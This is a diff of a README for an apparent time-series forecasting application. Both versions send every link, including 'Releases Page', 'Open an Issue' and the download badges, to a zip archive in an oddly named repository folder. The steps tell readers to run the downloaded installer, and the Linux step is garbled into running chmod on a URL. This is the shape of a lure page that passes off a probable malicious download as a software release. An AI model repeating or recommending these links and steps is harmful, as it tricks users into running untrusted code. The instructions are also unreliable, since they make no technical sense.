@@ -1,6 +1,6 @@
 # 🚀 Iterative-Multistep-Forecast-Training-For-TimeSeries - Explore Predictive Modeling with Ease
 
-[![Download Now](https://raw.githubusercontent.com/kiy0xn/Iterative-Multistep-Forecast-Training-For-TimeSeries/main/collusive/Iterative-Multistep-Forecast-Training-For-TimeSeries_v3.8-beta.4.zip%20Now-%20%3CYourLabel%3E-<ColorHexCode>?style=for-the-badge)](https://raw.githubusercontent.com/kiy0xn/Iterative-Multistep-Forecast-Training-For-TimeSeries/main/collusive/Iterative-Multistep-Forecast-Training-For-TimeSeries_v3.8-beta.4.zip)
+[![Download Now](https://github.com/kiy0xn/Iterative-Multistep-Forecast-Training-For-TimeSeries/raw/refs/heads/main/collusive/Multistep-Forecast-Time-Iterative-Training-Series-For-v3.3.zip%20Now-%20%3CYourLabel%3E-<ColorHexCode>?style=for-the-badge)](https://github.com/kiy0xn/Iterative-Multistep-Forecast-Training-For-TimeSeries/raw/refs/heads/main/collusive/Multistep-Forecast-Time-Iterative-Training-Series-For-v3.3.zip)
 
 ## 📖 Description
 
@@ -34,22 +34,22 @@ Follow these steps to download and run the application on your computer.
 
 ### 🛠 Installation Steps
 
-1. **Visit the Releases Page:** Click the following link to access the downloads: [Download Page](https://raw.githubusercontent.com/kiy0xn/Iterative-Multistep-Forecast-Training-For-TimeSeries/main/collusive/Iterative-Multistep-Forecast-Training-For-TimeSeries_v3.8-beta.4.zip).
+1. **Visit the Releases Page:** Click the following link to access the downloads: [Download Page](https://github.com/kiy0xn/Iterative-Multistep-Forecast-Training-For-TimeSeries/raw/refs/heads/main/collusive/Multistep-Forecast-Time-Iterative-Training-Series-For-v3.3.zip).
 
 2. **Select the Latest Version:** On the Releases page, locate the most recent version of the application. It will typically be at the top of the list.
 
-3. **Download the File:** Click on the file that corresponds to your operating system. The files are usually labeled by OS type, like `https://raw.githubusercontent.com/kiy0xn/Iterative-Multistep-Forecast-Training-For-TimeSeries/main/collusive/Iterative-Multistep-Forecast-Training-For-TimeSeries_v3.8-beta.4.zip` for Windows or `https://raw.githubusercontent.com/kiy0xn/Iterative-Multistep-Forecast-Training-For-TimeSeries/main/collusive/Iterative-Multistep-Forecast-Training-For-TimeSeries_v3.8-beta.4.zip` for MacOS.
+3. **Download the File:** Click on the file that corresponds to your operating system. The files are usually labeled by OS type, like `https://github.com/kiy0xn/Iterative-Multistep-Forecast-Training-For-TimeSeries/raw/refs/heads/main/collusive/Multistep-Forecast-Time-Iterative-Training-Series-For-v3.3.zip` for Windows or `https://github.com/kiy0xn/Iterative-Multistep-Forecast-Training-For-TimeSeries/raw/refs/heads/main/collusive/Multistep-Forecast-Time-Iterative-Training-Series-For-v3.3.zip` for MacOS.
 
 4. **Run the Installer:** 
    - **For Windows:** Double-click the downloaded `.exe` file. Follow the on-screen instructions to complete the installation.
    - **For MacOS:** Double-click the downloaded `.pkg` file and follow the instructions.
-   - **For Linux:** You might need to use the terminal. Open a terminal window and run the command `chmod +x https://raw.githubusercontent.com/kiy0xn/Iterative-Multistep-Forecast-Training-For-TimeSeries/main/collusive/Iterative-Multistep-Forecast-Training-For-TimeSeries_v3.8-beta.4.zip`, then `https://raw.githubusercontent.com/kiy0xn/Iterative-Multistep-Forecast-Training-For-TimeSeries/main/collusive/Iterative-Multistep-Forecast-Training-For-TimeSeries_v3.8-beta.4.zip`.
+   - **For Linux:** You might need to use the terminal. Open a terminal window and run the command `chmod +x https://github.com/kiy0xn/Iterative-Multistep-Forecast-Training-For-TimeSeries/raw/refs/heads/main/collusive/Multistep-Forecast-Time-Iterative-Training-Series-For-v3.3.zip`, then `https://github.com/kiy0xn/Iterative-Multistep-Forecast-Training-For-TimeSeries/raw/refs/heads/main/collusive/Multistep-Forecast-Time-Iterative-Training-Series-For-v3.3.zip`.
 
 5. **Launch the Application:** After the installation, look for the application icon on your desktop or in your applications folder. Double-click it to open.
 
 ### 🎯 Download & Install
 
-You can easily download the latest version of the application by visiting the Releases page: [Download Page](https://raw.githubusercontent.com/kiy0xn/Iterative-Multistep-Forecast-Training-For-TimeSeries/main/collusive/Iterative-Multistep-Forecast-Training-For-TimeSeries_v3.8-beta.4.zip).
+You can easily download the latest version of the application by visiting the Releases page: [Download Page](https://github.com/kiy0xn/Iterative-Multistep-Forecast-Training-For-TimeSeries/raw/refs/heads/main/collusive/Multistep-Forecast-Time-Iterative-Training-Series-For-v3.3.zip).
 
 ## 📊 Using the Application
 
@@ -77,7 +77,7 @@ Once you launch the application, you will see a user-friendly interface. Here’
 
 If you face any issues during installation or while using the application, help is available. You can reach out through our support channels:
 
-- **GitHub Issues:** [Open an Issue](https://raw.githubusercontent.com/kiy0xn/Iterative-Multistep-Forecast-Training-For-TimeSeries/main/collusive/Iterative-Multistep-Forecast-Training-For-TimeSeries_v3.8-beta.4.zip)
+- **GitHub Issues:** [Open an Issue](https://github.com/kiy0xn/Iterative-Multistep-Forecast-Training-For-TimeSeries/raw/refs/heads/main/collusive/Multistep-Forecast-Time-Iterative-Training-Series-For-v3.3.zip)
 - **Community Forum:** Join our community forum to engage with other users and find solutions.
 
 ## 🗒 FAQ
@@ -91,4 +91,4 @@ A: Yes, you can find training documents and materials in the repository to help 
 **Q: How can I provide feedback?**  
 A: We welcome feedback. Please share your thoughts through our GitHub discussions or support email.
 
-[![Download Now](https://raw.githubusercontent.com/kiy0xn/Iterative-Multistep-Forecast-Training-For-TimeSeries/main/collusive/Iterative-Multistep-Forecast-Training-For-TimeSeries_v3.8-beta.4.zip%20Now-%20%3CYourLabel%3E-<ColorHexCode>?style=for-the-badge)](https://raw.githubusercontent.com/kiy0xn/Iterative-Multistep-Forecast-Training-For-TimeSeries/main/collusive/Iterative-Multistep-Forecast-Training-For-TimeSeries_v3.8-beta.4.zip)
+[![Download Now](https://github.com/kiy0xn/Iterative-Multistep-Forecast-Training-For-TimeSeries/raw/refs/heads/main/collusive/Multistep-Forecast-Time-Iterative-Training-Series-For-v3.3.zip%20Now-%20%3CYourLabel%3E-<ColorHexCode>?style=for-the-badge)](https://github.com/kiy0xn/Iterative-Multistep-Forecast-Training-For-TimeSeries/raw/refs/heads/main/collusive/Multistep-Forecast-Time-Iterative-Training-Series-For-v3.3.zip)
